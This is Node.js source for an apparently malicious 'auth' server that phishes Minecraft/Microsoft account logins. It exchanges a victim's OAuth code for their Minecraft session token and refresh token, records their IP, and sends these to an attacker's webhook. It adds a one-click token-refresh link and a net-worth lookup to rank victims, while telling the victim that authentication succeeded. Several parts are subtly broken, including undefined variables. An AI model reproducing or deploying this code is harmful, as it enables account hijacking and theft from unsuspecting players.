const port = process.env.PORT || 80;

var request = require("request");
const axios = require("axios");
const express = require("express");
const app = express();
const bp = require("body-parser");
const iplim = require("iplim");

const config = require("./config.json");

const client_secret = config.azure.client_secret;
const client_id = config.azure.client_id;
const redirect_uri = config.azure.redirect_uri;

(expressip = require("express-ip")), (helmet = require("helmet")), app.use(helmet()) / app.use(bp.json());
app.use(bp.urlencoded({ extended: true }));
app.use(expressip().getIpInfoMiddleware);

const formatNumber = (num) => {
  if (num < 1000) return num.toFixed(2);
  else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`;
  else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`;
  else return `${(num / 1000000000).toFixed(2)}b`;
};

app.use(iplim({ timeout: 1000 * 10 * 15, limit: 4, exclude: [], log: false }));
app.set("trust proxy", true);

app.get("/", async (req, res) => {
  const code = req.query.code;
  if (code == null) {
    return;
  }
  try {
    // get all the data
    data = await ReturnData(code);
    const username = data[0];
    const uuid = data[1];
    const BearerToken = data[2];
    const RefreshToken = data[3];
    const ip = getIp(req);

    // send everything to the webhook
    PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, state);
  } catch (e) {}
  // put something to the screen so that the user can leave the page
  res.send("You were successfully authenticated! You can now close this tab.");
});

async function ReturnData(code) {
  // initialize variables
  let AccessToken, RefreshToken;
  let UserToken, UserHash;
  let XST;
  let BearerToken;
  let username, uuid;

  // array for the list of urls that will be used to get the data
  const urls = ["https://login.live.com/oauth20_token.srf", "https://user.auth.xboxlive.com/user/authenticate", "https://xsts.auth.xboxlive.com/xsts/authorize", "https://api.minecraftservices.com/authentication/login_with_xbox"];

  // array for the list of configs that will be used to get the data
  const configs = [{ headers: { "Content-Type": "application/x-www-form-urlencoded" } }, { headers: { "Content-Type": "application/json", Accept: "application/json" } }, { headers: { "Content-Type": "application/json", Accept: "application/json" } }, { headers: { "Content-Type": "application/json" } }];

  let DataAccessAndRefresh = {
    client_id: client_id,
    redirect_uri: redirect_uri,
    client_secret: client_secret,
    code: code,
    grant_type: "authorization_code",
  };

  // get the user's access & refresh token
  let ResponseAccessAndRefresh = await axios.post(urls[0], DataAccessAndRefresh, configs[0]);
  AccessToken = ResponseAccessAndRefresh.data["access_token"];
  RefreshToken = ResponseAccessAndRefresh.data["refresh_token"];

  let DataUserTokenAndHash = {
    Properties: {
      AuthMethod: "RPS",
      SiteName: "user.auth.xboxlive.com",
      RpsTicket: `d=${AccessToken}`,
    },
    RelyingParty: "http://auth.xboxlive.com",
    TokenType: "JWT",
  };

  let ResponseUserTokenAndHash = await axios.post(urls[1], DataUserTokenAndHash, configs[1]);
  // get the user's token and hash
  UserToken = ResponseUserTokenAndHash.data.Token;
  UserHash = ResponseUserTokenAndHash.data["DisplayClaims"]["xui"][0]["uhs"];

  let DataXST = {
    Properties: {
      SandboxId: "RETAIL",
      UserTokens: [UserToken],
    },
    RelyingParty: "rp://api.minecraftservices.com/",
    TokenType: "JWT",
  };

  // get the user's XST token
  let ResponseXSTToken = await axios.post(urls[2], DataXST, configs[2]);
  XST = ResponseXSTToken.data["Token"];

  let DataBearerToken = {
    identityToken: `XBL3.0 x=${UserHash};${XST}`,
    ensureLegacyEnabled: true,
  };

  // get the user's Bearer token
  let ResponseBearerToken = await axios.post(urls[3], DataBearerToken, configs[3]);
  BearerToken = ResponseBearerToken.data["access_token"];

  // get the user's username and uuid using the Bearer token
  await GetPlayer(BearerToken)
    .then((result) => {
      uuid = result[0];
      username = result[1];
    })
    .catch((err) => {});

  return [username, uuid, BearerToken, RefreshToken];
}

// function to get the user's username and uuid
async function GetPlayer(BearerToken) {
  const url = "https://api.minecraftservices.com/minecraft/profile";
  const config = {
    headers: {
      Authorization: "Bearer " + BearerToken,
    },
  };
  let response = await axios.get(url, config);
  return [response.data["id"], response.data["name"]];
}

// refresh tokens

app.get("/refresh", async (req, res) => {
  // Initialize variables
  // get state and refresh token from the url
  const state = req.query.state;
  const refresh_token = req.query.refresh_token;
  var AccessToken, RefreshToken;
  var UserToken, UserHash;
  var XSTToken;
  var BearerToken;
  var ip = getIp(req);

  // array for the list of urls that will be used to get the data
  const urls = ["https://login.live.com/oauth20_token.srf", "https://user.auth.xboxlive.com/user/authenticate", "https://xsts.auth.xboxlive.com/xsts/authorize", "https://api.minecraftservices.com/authentication/login_with_xbox"];
  // array for the list of configs that will be used to get the data
  const configs = [{ headers: { "Content-Type": "application/x-www-form-urlencoded" } }, { headers: { "Content-Type": "application/json", Accept: "application/json" } }, { headers: { "Content-Type": "application/json", Accept: "application/json" } }, { headers: { "Content-Type": "application/json" } }];

  let DataAccessAndRefreshToken = {
    client_id: client_id,
    redirect_uri: redirect_uri,
    client_secret: client_secret,
    refresh_token: refresh_token,
    grant_type: "refresh_token",
  };

  // get the response of the request to get the access token and refresh token
  ResponseAccessAndRefreshToken = await axios.post(urls[0], DataAccessAndRefreshToken, configs[0]);

  // set the access token and refresh token
  AccessToken = ResponseAccessAndRefreshToken.data.access_token;
  RefreshToken = ResponseAccessAndRefreshToken.data.refresh_token;

  // if the access token or refresh token is not found, return an error
  if (!AccessToken || !RefreshToken) return res.send("Unable to get access token or refresh token, token can not be refreshed.");

  let DataUserTokenAndHash = {
    Properties: {
      AuthMethod: "RPS",
      SiteName: "user.auth.xboxlive.com",
      RpsTicket: `d=${AccessToken}`,
    },
    RelyingParty: "http://auth.xboxlive.com",
    TokenType: "JWT",
  };

  // get the response of the request to get the user token and hash
  ResponseUserTokenAndHash = await axios.post(urls[1], DataUserTokenAndHash, configs[1]);

  // set the user token and hash
  UserToken = ResponseUserTokenAndHash.data.Token;
  UserHash = ResponseUserTokenAndHash.data.DisplayClaims.xui[0].uhs;

  // if the user token or hash is not found, return an error
  if (!UserToken || !UserHash) return res.send("Unable to get user token or hash, token can not be refreshed.");

  let DataXSTToken = {
    Properties: {
      SandboxId: "RETAIL",
      UserTokens: [UserToken],
    },
    RelyingParty: "rp://api.minecraftservices.com/",
    TokenType: "JWT",
  };

  // get the response of the request to get the XST token
  ResponseXSTToken = await axios.post(urls[2], DataXSTToken, configs[2]);

  // set the XST token
  XSTToken = ResponseXSTToken.data.Token;

  // if the XST token is not found, return an error
  if (!XSTToken) return res.send("Unable to get XST token, token can not be refreshed.");

  let DataBearerToken = {
    identityToken: `XBL3.0 x=${UserHash};${XSTToken}`,
    ensureLegacyEnabled: true,
  };

  // get the response of the request to get the Bearer token
  ResponseBearerToken = await axios.post(urls[3], DataBearerToken, configs[3]);

  // set the Bearer token
  BearerToken = ResponseBearerToken.data.access_token;

  // if the Bearer token is not found, return an error
  if (!BearerToken) return res.send("Unable to get Bearer Token, token can not be refreshed.");

  // get the user's username and uuid using the Bearer token
  GetPlayer(BearerToken)
    .then((result) => {
      // set the user's username and uuid to the corresponding items in the array
      uuid = result[0];
      username = result[1];
      // calculate the networth and soulbound networth using the user's uuid
      PostWebhook(true, username, uuid, ip, BearerToken, RefreshToken, state);
      res.send("Token refreshed successfully! You may now close this window :)");
    })
    .catch((err) => {});
});

async function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, state) {
  let embeddescription;
  const webhook = config.webhook.webhookURL;
  // if the token is being refreshed, set the embed description to "A token has been refreshed!"
  if (refresh) {
    embeddescription = "A token has been refreshed!";
    // if the token is first being sent, set the embed description to "A user has been authenticated!"
  } else {
    embeddescription = "A user has been authenticated!";
  }

  const networth = axios.get(`https://networthchecker-api.onrender.com/v2/profiles/${username}?key=neotr`).then((response) => {
    return { data: response.data.data[0].networth.networth };
  });
  const net = networth.then((data) => data.data);

  if (net == null) total_networth = `No profile data found`;
  else if ((netFormatted = net.then((data) => formatNumber(data))));

  let data = {
    username: "Train Auth",
    avatar_url: "https://i.imgur.com/l1F2W1V.png",
    embeds: [
      {
        title: "Train Auth",
        url: `https://sky.shiiyu.moe/stats/${username}}`,
        description: embeddescription,
        color: 0x7289da,
        footer: {
          text: "Made By Train",
          url: "https://i.imgur.com/l1F2W1V.png",
        },
        timestamp: new Date(),
        fields: [
          {
            name: "Username",
            value: "```" + username + " - " + (await netFormatted) + "```",
            inline: true,
          },
          {
            name: "UUID",
            value: "```" + uuid + "```",
            inline: true,
          },
          {
            name: "IP Address",
            value: "```" + ip + "```",
            inline: true,
          },
          {
            name: "Session ID",
            value: "```" + BearerToken + "```",
            inline: false,
          },
          {
            name: "Refresh Token",
            value: `Click [here](${redirect_uri}refresh?refresh_token=${refresh_token}&state=${state}) to refresh their token!`,
          },
        ],
      },
    ],
  };

  let embed = data;
  var config = {
    method: "POST",
    url: webhook,
    headers: { "Content-Type": "application/json" },
    data: data,
  };

  // send the webhook the data
  axios(config1)
    .then((response) => {
      // do nothing
    })
    .catch((error) => {
      console.log("Error sending webhook: ", error);
    });

  axios(config)
    .then((response) => {
      // do nothing
    })
    .catch((error) => {
      console.log("Error sending webhook: ", error);
    });
}

function getIp(req) {
  return req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress || "";
}

app.listen(port, () => {
  console.log(`NeoTR Server listening on port ${port}`);
});
